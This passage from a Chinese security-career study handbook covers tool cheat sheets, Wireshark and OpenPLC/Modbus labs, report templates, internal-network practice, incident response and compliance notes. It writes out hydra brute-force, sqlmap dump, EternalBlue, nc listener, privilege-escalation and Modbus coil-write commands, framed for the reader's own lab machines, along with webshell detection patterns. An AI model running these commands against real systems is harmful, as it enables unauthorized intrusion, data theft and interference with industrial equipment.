hydra -l admin -P 字典.txt 靶机IP http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```
字典：Kali 自带 `/usr/share/wordlists/rockyou.txt`（约 1400 万条）。

### sqlmap（SQL 注入）

```bash
sqlmap -u "URL?id=1" --cookie="security=low; PHPSESSID=xxx" --batch
sqlmap -u "URL?id=1" --cookie="..." --dbs            # 库
sqlmap -u "URL?id=1" --cookie="..." -D 库名 --tables  # 表
sqlmap -u "URL?id=1" --cookie="..." -D 库名 -T 表 --dump  # 数据
```
详细版见 （见本文件【15_SQL注入进阶手册.md】一节）。

### 目录扫描（dirsearch / gobuster / ffuf，三选一）

```bash
dirsearch -u http://靶机IP -e php,txt,zip,bak     # 常用字典+常见后缀
gobuster dir -u http://靶机IP -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://靶机IP/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
用途：找后台、备份文件、隐藏目录（CTF 第 3 题的解法）。

### curl（命令行发请求）

```bash
curl -I http://靶机IP          # 只看响应头
curl -o 文件 地址               # 下载
curl -X POST -d "a=1" 地址      # POST 表单
curl -A "Mozilla/5.0" 地址     # 自定义 UA
```

### nc / netcat（瑞士军刀）

```bash
nc -lvnp 4444                    # 本机监听 4444
nc 目标IP 4444                   # 连过去
echo "hello" | nc 目标 80        # 手动发数据
```
概念（靶场用）：正向 shell = 目标开端口等你连；反向 shell = 目标主动连回你。原理搞清楚即可，别在非授权环境用。

### msfconsole / searchsploit（框架与漏洞库）

```bash
searchsploit 关键词             # 本地搜漏洞利用
msfconsole                       # 进框架
> search ms17_010                # 搜模块
> use exploit/windows/smb/ms17_010_eternalblue
> set RHOSTS 靶机IP
> run
```
配 （见本文件【26_内网基础手册.md】一节） 的 MS17-010 实验。

### john / hashcat（哈希破解）

```bash
echo '5f4dcc3b5aa765d61d8327deb882cf99' > hash.txt   # 假设这是密码的 MD5
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt                                  # 看结果
```

第一周只要会用：**nmap、curl、hydra、dirsearch**。这四个覆盖 80% 的靶场任务。其余用到再查。

# 19. 【19_Wireshark抓包分析实战手册.md】

## Wireshark 抓包分析实战手册（五个实验，做完会分析）

### 0. 三个用途

1. 学协议：看不见就听不懂，抓下来看真的
2. 验证攻击：你发的 payload 在包里长什么样
3. 应急取证：被黑之后，流量是证据

### 1. 界面三区 + 过滤器

三区：包列表（上）/ 包详情（中，能展开看每一层）/ 原始字节（下）。
常用过滤器（详见 （见本文件【09_网络协议速查表.md】一节））：`ip.addr==目标`、`tcp.port==80`、`http`、`tcp.flags.syn==1`、`mbtcp`、`s7comm`。

### 2. 实验一：看 TCP 三次握手

1. 开抓包 → 浏览器访问任意网站 → 停
2. 过滤 `tcp` → 找到 `[SYN]`、`[SYN, ACK]`、`[ACK]` 三个连续包
3. 展开中间包看 Flags 位，记住顺序
**验收**：能指着三个包说出"这是第几次握手"。

### 3. 实验二：看 HTTP 明文 vs HTTPS

1. 访问 `http://example.com` → 过滤 `http` → 找到请求，右键 **Follow → TCP Stream**
2. 看到完整明文（请求头 + 响应） = 为什么明文传输危险
3. 再访问一个 https 网站 → 同过滤 → **只有乱码** = 为什么需要证书
**验收**：能讲"HTTP 裸奔、HTTPS 加密"的包级证据。

### 4. 实验三：看 Modbus TCP（你的工控实验）

1. 起 OpenPLC，Python 跑读写脚本的同时抓包（配合 （见本文件【25_工控实验手册_OpenPLC与Modbus.md】一节））
2. 过滤 `mbtcp` 或 `tcp.port==502`
3. 展开每个包找 **Function Code**：读线圈=1、写线圈=5、读保持寄存器=3、写寄存器=6/16
4. **验证"无认证无加密"**：包里的功能码、地址、数据全是明文，一眼看懂
**验收**：能对着一个包说出"它在读什么、地址多少"——这是工控安全面试的实物级证据。

### 5. 实验四：看 ARP 问答

1. 过滤 `arp`
2. 正常现象：`Who has 192.168.x.x? Tell ...` + 一条应答
3. **攻击特征**：短时间内大量"免费 ARP"（同一 MAC 冒充网关 IP 反复广播）＝ 有人在做 ARP 欺骗
**验收**：能区分"正常问答"和"欺骗广播"。

### 6. 实验五：看爆破流量

1. 用 hydra 爆自己的靶机（（见本文件【18_安全工具命令速查合集.md】一节））
2. 同时抓包 → 过滤 `tcp.port==22` 或 80
3. 特征：同一源 IP → 大量连接/登录请求 → 全部失败
**验收**：能从流量侧描述"爆破长什么样"——蓝队研判就是这个思路（见 （见本文件【34_护网HW经验速成.md】一节））。

### 7. 三个提速技巧

- 右键 → **Follow → TCP Stream**：把一次会话的所有包连起来看（最常用）
- **Statistics → Conversations**：看谁跟谁聊得最多（找异常外联）
- **File → Export Objects → HTTP**：把抓到的文件直接导出来

### 8. 常见坑

- 抓不到 HTTPS 明文：正常，加密的。除非装好你自己的证书做中间人
- 抓不到别人的包：你没在混杂模式/不在同一广播域——只抓自己的流量就够了
- 包太多眼花：先 `Statistics → Protocol Hierarchy` 看整体，再逐步过滤

### 9. 打卡作业

五个实验各截一张图，每周重做一次。到第 4 周你能不看笔记讲清"三次握手 + Modbus 功能码"，这项技能就算毕业。

# 20. 【20_渗透测试报告写作模板.md】

## 渗透测试报告写作模板（乙方安服的交付物就是报告）

> 一句话：技术再牛，报告稀烂，等于白干。面试官让你"讲讲你的项目"，讲的就是报告结构。

### 1. 报告标准骨架（七大块）

1. **封面/项目信息**：委托方、测试范围（IP/域名清单）、测试时间、密级、双方人员
2. **摘要（最重要，给领导看的）**：整体风险结论 + 高危几个 + 一句话建议。领导只看这一页
3. **测试概述**：范围、方法（黑盒/白盒）、工具（Nmap/Burp/sqlmap）、授权依据
4. **漏洞详情**：每条漏洞一个标准条目（见下）
5. **风险统计表**：高危 x 个 / 中危 x 个 / 低危 x 个
6. **整改建议汇总**：按"先修什么"排序
7. **附录**：工具输出、扫描原始记录

### 2. 漏洞条目模板（照抄填空，每个漏洞一页）

```
【高危】SQL 注入
漏洞位置：http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1
漏洞描述：id 参数未做任何过滤，被直接拼接进 SQL 语句。
         攻击者可用 union 查询从 information_schema 拖出全部用户数据。
证明截图：（注入成功、拖出数据的截图，红框标出关键位置）
复现步骤：1. 访问 xx 页面  2. 输入 xx  3. 出现 xx 现象
风险等级：高危（CVSS 8.8）
修复建议：1. 使用参数化查询（预编译语句）
          2. 数据库账号最小权限
          3. 关闭报错回显，统一错误页
```

### 3. 等级怎么定（不背 CVSS 也能判断）

- **高危**：能拿权限、能拖敏感数据、能直接攻下系统
- **中危**：信息泄露、弱口令、缺少防护配置
- **低危**：版本信息泄露、不必要端口开放、小配置问题

拿不准就写"参考 CVSS 评分，综合业务影响定为 X 级"。

### 4. 写作三铁律

1. **每个漏洞必须有截图 + 复现步骤**——别人照着你的步骤能重现，报告才成立
2. **修复建议必须可执行**——写"参数化查询""改最小权限"，不写"加强安全意识"
3. **措辞客观**——写"攻击者可能获取数据"，不写"数据已经泄露"；不夸大、不甩锅

### 5. 常见低级错误（面试官扫一眼就 pass）

- 只贴扫描器原始输出，一行都不分析
- 截图没有标注，看不出问题在哪
- 建议写"加强安全管理"这种废话
- 不写影响面（"能拖全库数据"必须点明）
- 名词乱用（把"漏洞"叫"病毒"）

### 6. 练习任务（第 2 周结束前交）

把你 DVWA 四关的截图整理成一份 **4 个漏洞的迷你报告**（就按上面的模板，共 4 页 + 1 页摘要）。

这份东西放进 GitHub，简历里写"能独立撰写渗透测试报告"就有证据了——**应届生里没几个人拿得出这个。**

# 22. 【22_BurpSuite使用手册.md】

## Burp Suite 使用手册（面试必问的工具）

### 0. 是什么

Burp Suite 是一个**中间人代理**：你把它架在浏览器和目标网站之间，所有 HTTP(S) 请求都能被它看到、拦下、修改、重发。渗透测试 90% 的时间在它上面。

Kali 自带（菜单里搜 burpsuite），版本 Community 免费够用。

### 1. 配置三步（一次配好）

1. 浏览器代理设成 `127.0.0.1:8080`（Firefox：设置→网络设置→手动代理）
2. 浏览器访问 `http://burp` → 右上角下载 CA 证书
3. 导入浏览器并设为"信任"（Firefox：设置→隐私与安全→证书→查看证书→导入）

**不装证书，所有 HTTPS 页面全是乱码抓不到**——90% 的初学者卡在这。

### 2. Proxy（拦截）

- Intercept is **on**：请求会停在 Burp 里等你
- **Forward**：放行这个包
- **Drop**：丢了这个包
- 改包：直接在界面里改（改参数、改 UA、改 cookie），再 Forward
- HTTP history：所有流量的历史记录，点一条右键可以送到别的模块

### 3. Repeater（手动测试主战场）

单个请求反复改、反复发：

1. 在 HTTP history 里对目标请求右键 → **Send to Repeater**
2. 左边改参数（比如把 `id=1` 改成 `id=1'`）
3. 点 Send → 右边看响应变化

DVWA 的 SQL 注入、命令注入全在这里手动测——**这是面试官认为"会用 Burp"的最低标准**。

### 4. Intruder（批量爆破）

1. 把登录请求 Send to Intruder
2. Positions 标签：把要变的位置用 `§§` 标记（比如密码字段）
3. Payloads 标签：加载字典（Kali 自带 `/usr/share/wordlists/rockyou.txt`）
4. Start attack → 看结果：**响应长度和其他不一样的那条**，多半就是成功

用途：爆破弱口令、枚举目录、批量测参数。

### 5. Decoder / Comparer（辅助）

- Decoder：Base64、URL 编解码（右键 → Send to Decoder）
- Comparer：对比两个响应找差异（比如正确密码 vs 错误密码的响应）

### 6. 实战三连（配 DVWA，做完就算会用）

1. **抓包**：浏览器打开 DVWA 登录页，Burp 里把请求拦下来 → 看懂请求头里的 cookie、参数
2. **Repeater 测 SQLi**：DVWA SQL Injection 的请求送进 Repeater，把 id 参数改成 `1'` 观察报错
3. **Intruder 爆破**：DVWA 登录页用 Intruder，字典放 `admin/password/123456/test`，看哪条响应长度不同

### 7. 常见坑

- 代理没关/拦截开着忘了 → 浏览器一直转圈：把 Intercept 关掉（或 Forward 掉积压的包）
- 抓不到 HTTPS → 证书没导入信任
- Intruder 没反应 → 看请求里是不是缺 cookie（DVWA 要先登录，session 在 cookie 里）
- 中文乱码 → 用响应窗口的编码设置

### 8. 面试怎么答"你会用 Burp 吗"

标准答法：**"会。Proxy 抓包改包、Repeater 手工测参数、Intruder 做爆破，配合 DVWA 做过 SQL 注入和登录爆破的完整验证。"**——说出模块名 + 干过什么事，比说"熟练"强十倍。

# 23. 【23_CTF入门5题.md】

## CTF 入门 5 题（做完就算"打过 CTF"）

> 平台：BUUCTF（buuoj.cn）Web 分类，注册即打。每题 30 分钟，卡住查 WriteUp，看懂后自己再复现一遍。
> 只做平台自己的题目，不碰任何真实系统。

### 第 1 题：view_source

- 目标：页面提示"flag 就在源代码里"
- 思路：按 F12 看源码，或直接看页面源代码
- 知识点：**信息收集的第一课——前端藏不住秘密**
- 命令：`Ctrl+U` 或 F12 → Elements

### 第 2 题：robots

- 目标：网站根目录的 robots.txt 里指了个目录
- 思路：访问 `/robots.txt` → 看它 Disallow 了哪个路径 → 访问那个路径
- 知识点：robots.txt 是给爬虫看的"哪里别去"，反过来就是"哪里藏了东西"

### 第 3 题：备份文件

- 目标：网站源码没删干净，留了 `index.php.bak` 或 `www.zip`
- 思路：试常见备份名：`.bak`、`.swp`、`www.zip`、`.tar.gz`、`.git`
- 知识点：**部署习惯漏洞**——拿到备份 = 拿到源码，审计源码找 flag
- 小工具：`dirsearch -u 目标 -e bak,zip`（Kali 里 pip 装）

### 第 4 题：Cookie 欺骗

- 目标：Cookie 里有个 `admin=0`，改成 1 就成管理员
- 思路：F12 → Application → Cookies → 把值改了 → 刷新
- 知识点：**客户端的数据永远不可信**，权限判断必须在服务端做
- 变体：`user=guest` 改 `user=admin`、JWT 里的 role 字段

### 第 5 题：简单 SQL 注入

- 目标：登录框/参数有注入点

# 25. 【25_工控实验手册_OpenPLC与Modbus.md】

## 工控实验手册：OpenPLC + Modbus + Python（第 3 周用）

> 目标：零硬件完成"PLC → Modbus → Python 采集/改值"，这是你 OT 方向的第一个硬实验。
> 全部在本机进行，不碰任何真实设备。

### 1. 装 OpenPLC（10 分钟）

1. openplcproject.com → Download → 下载 **OpenPLC Runtime for Windows** 安装包
2. 安装后启动，浏览器打开 `http://localhost:8080`
3. 默认账号密码：`openplc` / `openplc`

### 2. 写第一个 PLC 程序（20 分钟）

1. 下载安装 **OpenPLC Editor**（同官网），新建项目
2. 程序类型选 ST（结构化文本），main 里写：

```st
PROGRAM main
VAR
    sensor AT %IX0.0 : BOOL;      (* 传感器输入，接到 %IX0.0 *)
    motor  AT %QX0.0 : BOOL;      (* 电机输出，接到 %QX0.0 *)
END_VAR
motor := sensor;                  (* 最简单逻辑：传感器动，电机就动 *)
END_PROGRAM
```

3. 生成程序 → 回 Runtime 网页 → 上传
4. 看到 Running 状态 = 你的第一个"PLC"在跑了

### 3. 用 Python 读写（pymodbus）

装库：`pip install pymodbus`（用你 78 目录的 .venv）

```python
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient("127.0.0.1", port=502)
c.connect()

## 实验一：读线圈（%QX0.0 对应 coil 地址 0）
rr = c.read_coils(0, 8)
print("线圈状态:", rr.bits)

## 实验二：写线圈——这就是"远程控制 PLC 输出"（攻击演示，只对自己的 OpenPLC）
c.write_coil(0, True)
print("已把第一个线圈置位")

## 实验三：读写保持寄存器（%QW0 对应地址 0）
c.write_register(0, 123)
print("寄存器0 =", c.read_holding_registers(0, 1).registers)

c.close()
```

**地址映射**（OpenPLC 官方文档为准）：`%QX0.0`→线圈 0，`%IX0.0`→离散输入 0，`%QW0`→保持寄存器 0，`%IW0`→输入寄存器 0。

### 4. 三个实验做完，写进打卡

1. **读**：Python 读 8 个线圈，能对上程序里的状态
2. **改**：Python 把线圈/寄存器改成危险值 → **体会一下：没有认证、没有加密，知道地址就能写——这就是工控安全的起点**
3. **采**：写一个循环，每 1 秒读一次寄存器，写入 CSV（加上 try/except，杀进程再启动也不崩）

### 5. Wireshark 抓 Modbus 包（加餐）

- 过滤器输入 `tcp.port == 502`
- 一边抓一边跑 Python 读写
- 看包里的 Function Code：读线圈=1、写线圈=5、读保持寄存器=3、写=6/16
- **能逐字段讲清一个 Modbus 请求包，就是你这周最大的收获**

### 6. 常见坑

- 连不上 502 端口：确认 OpenPLC Runtime 在运行；换端口或检查防火墙
- 网页打不开：只开 `http://`，不是 https
- pymodbus 报错没有 `read_coils`：pymodbus 3.x 用 `from pymodbus.client import ModbusTcpClient`（新写法），老教程的 `ModbusTcpClient` 直接 import 会失败
- 程序上传报错：Editor 和 Runtime 版本要对得上；先用官网给的示例程序测试

### 7. 周报产出（这就是简历项目）

写 10 行：系统构成（OpenPLC + Modbus TCP + Python 客户端）→ 我做了什么（读/写/采集）→ 发现了什么安全问题（无认证、明文、可任意写）→ 建议（加访问控制、网络隔离）。这份东西以后就是简历上"工控仿真环境安全测试"的雏形。

# 26. 【26_内网基础手册.md】

## 内网基础手册（打完 DVWA 之后）

> 只打自己的靶机（Metasploitable2、VulnHub 虚拟机）。对内网真实环境动手是刑事风险。

### 0. 一句话定位

外网渗透是"进门"，内网渗透是"进门之后能走多远"。面试中"你会内网吗"= 会提权、会横向、会查网络结构。

### 1. 前置条件

- Kali + 一台靶机在同一网段（VMware 都设"仅主机模式"或都桥接）
- 推荐靶机：**Metasploitable2**（入门专用，全是洞）或 VulnHub 的 Kioptrix
- 你已经有了一台机器的 shell 之后，才进入内网阶段

### 2. 内网渗透四步

信息收集 → 提权 → 横向移动 → 权限维持/清理痕迹

### 3. 信息收集（先看明白自己在哪）

Linux 上拿到 shell 后：
```
id                 # 我是谁，什么权限
uname -a           # 系统版本（提权要看）
ip a; route -n     # 我在哪个网段，通向哪
arp -a             # 邻居有哪些机器
cat /etc/passwd    # 有哪些用户
sudo -l            # 我能用 sudo 跑什么（提权金矿）
crontab -l         # 定时任务（可能藏后门/提权点）
find / -perm -4000 -type f 2>/dev/null   # 找 SUID 文件
```
Windows 上：
```
whoami; ipconfig /all; netstat -ano; tasklist; net user
```

### 4. 提权（三个必做实验）

实验一：**SUID 提权**（Linux）
`find / -perm -u=s -type f 2>/dev/null` 找到带 SUID 位的命令后，查它能不能被滥用（靶场里常是 find/vim 等）——SUID = 这个程序以文件主人的身份跑，跑出个 root 的 find 就是 root。

实验二：**sudo 滥用**
`sudo -l` 列出可免密执行的命令 → 查 GTFO（gtfobins.github.io）找对应命令的提权用法。

实验三：**内核漏洞提权**
`uname -a` 拿到版本 → `searchsploit 版本号` 找现成 exp（概念性了解即可，别依赖）。

### 5. 横向移动（常见服务与工具）

| 端口 | 服务 | 常见打法 |
|---|---|---|
| 445 | SMB | 弱口令、MS17-010（永恒之蓝） |
| 22 | SSH | hydra 弱口令爆破 |
| 3389 | RDP | 弱口令、爆破 |
| 3306 | MySQL | 弱口令 |
| 1433 | MSSQL | 弱口令、xp_cmdshell |

两个必做实验：

1. **SSH 爆破**（hydra）：
```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://靶机IP
```
2. **MS17-010**（msfconsole，只在靶机上）：
```
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 靶机IP
run
```

其他常用：`impacket`（psexec/wmiexec 概念）、`nmap -sV` 端口侦察、`searchsploit` 找漏洞。

### 6. 防御视角（面试时反过来问自己）

为什么横向能成功？→ 口令复用、不打补丁、无监控、无分段。
对应防御：补丁管理、强口令 + MFA、最小权限、日志审计、内网分段（VLAN/防火墙）。

### 7. 红线

- MS17-010、爆破、提权，全部只对**自己的靶机**
- 别对学校、别对任何人/公司的网段扫哪怕一个端口
- "练内网"的替代品：自己搭多台虚拟机组一个"小内网"

### 8. 完成标准

三个实验做完（SSH 爆破成功一次、SUID 提权成功一次、MS17-010 打进靶机一次），且能讲清楚"信息收集→提权→横向"每步在干嘛。

# 27. 【27_应急响应手册.md】

## 应急响应手册（乙方安服最常见的活儿）

### 0. 是什么

出事后第一时间"止血 → 排查 → 恢复 → 溯源 → 写报告"。面试官爱问这个，因为安服新人入职第一件事就是跟着做应急。

### 1. 标准处置流程（必背）

**准备 → 检测确认 → 抑制（隔离/断网）→ 根除（删马/修洞/改密码）→ 恢复 → 复盘报告**

关键原则：**先取证后处置**——上来就删东西会毁掉溯源证据。不确定时先问带教。

### 2. Linux 主机应急必查清单（按顺序敲）

```bash
who; w; last -20                    # 谁在登录、最近登录记录
awk -F: '$3==0 {print $1}' /etc/passwd   # 找 uid=0 的账户（多出来的就是后门账户）
history; cat ~/.bash_history        # 攻击者跑过什么
crontab -l; ls /etc/cron*           # 计划任务（挖矿/维持访问最爱藏这）
systemctl list-unit-files --state=enabled | grep -v vendor   # 开机自启
ps aux --sort=-%cpu | head -20      # 谁在吃 CPU（挖矿特征）
ss -antp                            # 网络连接：找异常外联 IP
find / -mtime -3 -type f 2>/dev/null | grep -vE '^/proc|^/sys'  # 近 3 天新增文件
tail -100 /var/log/auth.log         # 登录日志（爆破/成功登录都在）
```

再针对性查 webshell：
- 常见藏身处：网站 uploads 目录、tmp、图片目录
- 文件特征：`eval(`、`base64_decode(`、`assert(`、`shell_exec`
- 时间特征：网站文件里"最近被改动"的那个
- 工具：D盾、河马 webshell 查杀（免费）扫一遍

### 3. Windows 主机应急必查清单

```bat
netstat -ano | findstr ESTABLISHED   # 网络连接 + PID
tasklist | findstr PID               # 连接是谁的进程
msconfig                             # 启动项
schtasks /query                      # 计划任务
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run  # 注册表自启
```
事件查看器：安全日志看 4624（成功登录）/ 4625（失败登录）追踪爆破。

### 4. 三种常见场景怎么答

| 场景 | 处置要点 |
|---|---|
| **勒索病毒** | 先断网 → 绝不付钱 → 保留现场取证 → 找备份恢复 → 查入口（RDP 弱口令最常见） |
| **挖矿木马** | CPU 拉满 → 找到进程和它的父进程 → 杀掉 + 删计划任务 + 删自启 → 改密码 |
| **webshell** | 先隔离（改网站只读/下线）→ 查杀工具扫 → 找上传漏洞入口 → 修复漏洞 + 删马 |

### 5. 应急报告模板（写完发带教）

```
1. 事件概述：什么时间、谁发现、什么现象、影响范围
2. 时间线：xx:xx 出现异常 → xx:xx 确认 → xx:xx 处置
3. 处置过程：每一步做了什么、为什么
4. 根因分析：怎么进来的（弱口令/漏洞/钓鱼）
5. 整改建议：改密码、打补丁、加监控、备份策略
```

### 6. 面试怎么答"懂应急响应吗"

标准答法：**"懂流程。准备→确认→抑制→根除→恢复→复盘，Linux 上会查登录日志、计划任务、异常进程和外联，Windows 上会看事件日志和启动项。原则是先取证后处置。"** 能说出"先取证后处置"，你就超过了 80% 的应届生。

# 28. 【28_等保测评要点速记.md】

## 等保测评要点速记（主攻方向 · 笔试面试常考）

> 所有数字和细节以《信息安全技术 网络安全等级保护》最新版原文为准，本文是记忆骨架。

### 1. 一句话来源

《网络安全法》第 21 条：**国家实行网络安全等级保护制度**——"等保"是法律义务，不是可选项。这是"为什么要做等保"的标准答案。

### 2. 五个级别（定级表，必背）

| 级别 | 侵害对象 | 程度 | 监管 |
|---|---|---|---|
| 一级 | 公民、法人合法权益 | 一般损害 | 自主保护 |
| 二级 | 公民、法人合法权益（严重）/ 社会秩序公共利益（一般） | — | 指导 |
| 三级 | 社会秩序公共利益（严重）/ 国家安全（一般） | — | 监督检查 |
| 四级 | 国家安全 | 严重损害 | 强制监督检查 |
| 五级 | 国家安全 | 特别严重损害 | 专门监督检查 |

**定级两步走**：先看"侵害了谁的什么"（客体），再看"有多严重"（程度）。二级起步才强制备案，三级要每年测评。

### 3. 五个环节（流程，必背）

**定级 → 备案 → 建设整改 → 等级测评 → 监督检查**

### 4. 通用要求 10 大类（技术 5 + 管理 5）

技术类：
1. 安全物理环境（机房、供电、防水火）
2. 安全通信网络（网络架构、通信传输、可信验证）
3. 安全区域边界（边界防护、访问控制、入侵防范、恶意代码）
4. 安全计算环境（身份鉴别、访问控制、安全审计、数据保密性）
5. 安全管理中心（系统管理、审计管理、安全管理、集中管控）

管理类：
6. 安全管理制度　7. 安全管理机构　8. 安全管理人员
9. 安全建设管理　10. 安全运维管理

### 5. 测评怎么出结论

- 单项：符合 / 部分符合 / 不符合 / 不适用
- 综合：按得分定等级（约 90 以上优、80–89 良、70–79 中、70 以下差，以标准原文为准）
- 周期：三级系统每年至少一次等级测评；二级通常每两年（以最新监管要求为准）

### 6. 工控系统扩展要求（你的差异化考点）

在通用要求之外，等保 2.0 给工业控制系统加了扩展，记住关键词：

- **室外控制设备防护**（防风雨/防盗窃/防破坏）
- **工业控制系统网络架构安全**（IT/OT 分层、边界隔离）
- **拨号使用控制**、**无线使用控制**（现场设备最容易被从这两处绕进来）
- **控制设备安全**（PLC/RTU 本身的身份鉴别、固件、配置备份）
- 管理上强调：供应链安全、外包运维管理、漏洞与补丁管理（工控不能随时停机打补丁）

面试金句：**"IT 等保要保密，OT 等保先保命——可用性和人身安全优先。"**

### 7. IEC 62443 速记（国际标准，面试加分）

- 谁定的：ISA / IEC，面向工业自动化和控制系统安全的国际标准族
- 两大核心概念：**zones（区域）** 和 **conduits（管道）**——按风险把系统划成区域，区域之间只通过管道通信，管道上做防护
- 安全等级：SL 0–4（无保护 → 高级别）
- 和等保的关系：思路同源（分区、分层、纵深防御、管供应链），等保是国内的强制要求，62443 是国际框架

### 8. 面试高频 10 题

1. 为什么单位必须做等保？——法定义务（网安法 21 条），不做有行政处罚
2. 等保和关保（关键信息基础设施）什么关系？——关基在等保基础上加更严的保护要求（《关键信息基础设施安全保护条例》）
3. 定级怎么定？——客体 + 程度，必要时专家评审；定高多花钱，定低不达标
4. 一次测评现场做什么？——访谈、文档检查、配置核查、工具测试（漏扫）、渗透（授权范围内）
5. 工控系统能不能直接照搬 IT 等保？——不能：不能随便停机、协议老旧（Modbus 无认证）、要防的是"人身安全和停产"
6. 整改最常见的问题是什么？——弱口令、无安全审计、边界不清、无备份
7. "高风险项"是什么？——判定规则里会导致系统被直接攻破的项，有高风险项通常直接不合格/限期整改
8. 你用过什么测评工具？——漏洞扫描器（Nessus 类）、基线核查、Burp、Nmap（照实说自己会用的）
9. 为什么想做等保测评？——结合自己：机械+工控背景，能看懂工控系统，缺的就是这种"懂现场"的人
10. 能出差吗？——这行测评都是现场做，出差是常态，照实答

### 9. 记忆方法

第一周：背 5 个级别 + 5 个环节；第二周：背 10 大类；第三周：工控扩展关键词；第四周：把 10 道面试题用自己的话讲一遍。一个月滚完，之后每周翻一次。

# 29. 【29_等保测评实务手册.md】

## 等保测评实务手册（主攻方向：这个岗位每天在干嘛）

### 1. 一个测评项目全流程（背）

**签合同 → 资料收集 → 现场测评（访谈/检查/测试）→ 出具报告 → 整改 → 复测 → 备案**

你作为初级测评师，大部分时间在第 2–4 步。

### 2. 现场测评三件事（核心）

#### 访谈（问管理员）
- 有哪些资产、边界在哪、网络怎么分的
- 制度文档：安全管理制度、应急预案、备份策略有没有
- 口令策略、日志留存多久（等保要求至少 6 个月）
- 最近出过什么事、怎么处置的

#### 检查（配置核查）
- 操作系统/数据库/网络设备的安全基线：口令复杂度、是否开审计、补丁情况、多余账号
- 边界设备：防火墙策略、访问控制
- 机房：门禁、UPS、防水火

#### 测试（工具验证）
- 漏洞扫描（拿到授权后在测评范围内扫）
- 配置验证（比如：真的建个弱口令账号试试能不能登录）
- 功能测试：备份能不能恢复、审计日志能不能查

### 3. 初级测评师的分工（入职前半年）

# 30. 【30_工控安全面试专题20题.md】

## 工控安全面试专题 20 题（你的差异化武器）

> 通用面试题在 （见本文件【35_求职包_简历模板_面试题_2028届.md】一节），这 20 题是 OT 专属。能答上一半，面试官就会记住你。

1. **IT 和 OT 安全关注点有什么不同？**
IT：机密性优先，可停机打补丁。OT：**可用性和人身安全优先**，停机=停产=事故，补丁要等窗口。安全性排序是 AIC（可用性第一），不是 CIA。

2. **Modbus 协议有什么安全问题？**
设计年代没有敌手模型：无认证、无加密、无校验、明文、地址透明。知道 IP 和寄存器地址就能读、能写。防御靠网络层：分段、防火墙、白名单。

3. **PLC 有哪些攻击面？**
工程软件（TIA/STEP7 与 PLC 的通信）、协议端口（S7 102/Modbus 502）、HMI/组态接口、U 盘与维护口、固件更新、供应链（买来的设备带毒）。

4. **S7comm 协议的问题？**
西门子私有协议，明文、认证弱/可绕过，Shodan 上大量 102 端口暴露。模拟攻击有 s7 协议工具（s7-300/400 时代尤甚）。

5. **OPC UA 相比传统 OPC 的安全改进？**
OPC DA 基于 Windows COM/DCOM，配置难、不安全、跨平台差；OPC UA 跨平台，内建安全模型（证书、加密、身份认证、审计），是工控安全推荐方向。

6. **什么是 IT/OT 融合带来的风险？**
产线为了数据上云、远程运维打通网络，原来物理隔离的系统暴露给 IT 攻击面（勒索、蠕虫直达 PLC）。

7. **Purdue 模型是什么？分几层？**
工业网络参考模型：L0 现场设备 → L1 控制（PLC/RTU）→ L2 监控（HMI/SCADA）→ L3 生产管理（MES）→ L4/5 企业 IT。安全上**在 L2/L3 边界做隔离**是经典做法。

8. **工控怎么做纵深防御？**
物理隔离/网闸、网络分段（VLAN/防火墙）、协议白名单、访问控制与审计、终端加固、备份与应急。核心：假设边界一定会被突破，层层设防。

9. **Stuxnet 的技术要点？**
2010 年针对伊朗铀浓缩的蠕虫：借 U 盘进入物理隔离网络，利用多个 0day，专门改西门子 S7 的离心机转速，同时把 HMI 读数伪装成正常——**攻击者懂工艺**，这是它与普通病毒的本质区别。

10. **Industroyer 是什么？**
2016 年乌克兰电网事件的恶意软件家族，直接对变电站协议（IEC 61850/60870-5-104）说话，能拉闸。意义：**攻击者开始直说"电力方言"**。

11. **Triton/TRISIS 是什么？**
2017 年针对施耐德安全仪表系统（SIS）的攻击。SIS 是保命系统，攻击它 = 把安全屏障拆掉。标志着工控攻击从"捣乱"升级到"害命"。

12. **Conpot 蜜罐原理？**
伪装成西门子 PLC 的开源蜜罐，响应 Modbus/S7 等请求，记录攻击者的探测行为。价值：低成本获得真实工控攻击情报。你在第 4 周会亲手搭。

13. **为什么工控不能直接装杀毒、打补丁？**
杀毒误杀/扫描会拖慢实时控制、导致停机；补丁可能不兼容厂商软件、没人敢在生产环境试。所以靠**隔离、白名单、补丁窗口**而不是普通 IT 那套。

14. **等保 2.0 工控扩展要求要点？**
在通用要求上加：室外控制设备防护、工控网络架构安全、拨号/无线使用控制、控制设备安全、供应链与外包运维管理。你背过（（见本文件【28_等保测评要点速记.md】一节））。

15. **IEC 62443 核心概念？**
zones（区域）与 conduits（管道）：按风险把系统分成区，区间通信走管道并设防；安全等级 SL0–4。和等保思路同源（分区、纵深、供应链）。

16. **工控资产测绘怎么做？**
授权范围内：网段扫描（nmap 带工控脚本如 modbus-discover、s7-info）、协议指纹、被动流量分析；互联网侧用 Shodan/ZoomEye 了解暴露面。**先拿授权再扫。**

17. **网闸/单向隔离是什么？**
物理级单向传输设备，IT 侧数据只能"过河"到 OT 或反向只读，切断双向攻击通道。电力行业标准配置。

18. **功能安全（SIL）和信息安全什么关系？**
SIL 管"设备故障别害死人"，信息安全管"坏人别搞破坏"；现在两者融合——被黑掉的控制系统本身就是功能安全事故（Triton 就是例子）。所以安全 PLC 要同时考虑两者。

19. **让你评估一家小工厂的工控安全，怎么做？**
资产盘点（PLC/SCADA/上位机）→ 网络架构梳理（Purdue 分层、边界在哪）→ 授权扫描与漏洞核查 → 现场访谈（补丁/口令/备份）→ 出报告与整改建议。**按这个框架说，别慌。**

20. **你是机械制造及自动化专业，为什么适合做这个？**
标准答法：工控安全最大的问题是"安全的人不懂设备、懂设备的人不懂安全"。我懂 PLC 和现场（专业背景），又在补安全（DVWA/OpenPLC/Modbus 实验、报告）。我就是两边都能说话的人。

# 31. 【31_网络安全法规速记.md】

## 网络安全法规速记（等保测评岗笔试/面试常问）

> 数字和条文以官方原文为准，这里记骨架。面试要的是"知道有这部法 + 说得出一个要点"。

### 1. 《网络安全法》（2017.6.1 施行）

- **第 21 条**：国家实行**网络安全等级保护制度**——"等保"的法律来源，必背
